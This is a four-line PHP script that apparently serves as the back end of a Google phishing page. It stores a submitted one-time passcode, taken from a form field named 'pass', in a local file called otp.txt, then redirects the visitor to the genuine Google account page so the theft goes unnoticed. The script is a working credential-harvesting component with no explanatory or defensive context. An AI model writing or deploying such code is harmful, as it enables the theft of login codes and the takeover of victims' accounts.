<?php
file_put_contents("otp.txt", "Google OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://myaccount.google.com');
?>
